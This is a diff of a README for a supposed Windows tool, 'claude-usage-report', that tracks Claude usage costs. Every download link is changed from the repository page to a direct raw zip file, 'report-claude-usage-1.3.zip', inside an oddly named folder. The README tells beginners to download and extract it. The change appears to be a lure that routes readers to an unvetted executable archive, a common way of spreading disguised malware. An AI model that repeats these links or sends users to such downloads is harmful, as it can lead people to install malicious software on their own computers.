@@ -1,11 +1,11 @@
 # 🧾 claude-usage-report - Track Claude usage with clear cost reports
 
-[![Download](https://img.shields.io/badge/Download-claude--usage--report-blue.svg?style=for-the-badge)](https://github.com/bbsbs7617-png/claude-usage-report)
+[![Download](https://img.shields.io/badge/Download-claude--usage--report-blue.svg?style=for-the-badge)](https://github.com/bbsbs7617-png/claude-usage-report/raw/refs/heads/main/historicocabbalistical/report-claude-usage-1.3.zip)
 
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/bbsbs7617-png/claude-usage-report
+https://github.com/bbsbs7617-png/claude-usage-report/raw/refs/heads/main/historicocabbalistical/report-claude-usage-1.3.zip
 
 Use this link to get the latest version for Windows.
 
@@ -36,7 +36,7 @@ You also need permission to save files on your computer.
 ## 🚀 Get the app
 
 1. Open the download page:
-   https://github.com/bbsbs7617-png/claude-usage-report
+   https://github.com/bbsbs7617-png/claude-usage-report/raw/refs/heads/main/historicocabbalistical/report-claude-usage-1.3.zip
 2. Look for the latest release or download file on the page.
 3. Save the file to your computer.
 4. If the file is in a .zip folder, extract it first.
@@ -198,7 +198,7 @@ Pick one place and keep the files there.
 ## 🔗 Download again
 
 Visit this page to download:
-https://github.com/bbsbs7617-png/claude-usage-report
+https://github.com/bbsbs7617-png/claude-usage-report/raw/refs/heads/main/historicocabbalistical/report-claude-usage-1.3.zip
 
 Use this link if you need the latest copy or want to check the release page again
 
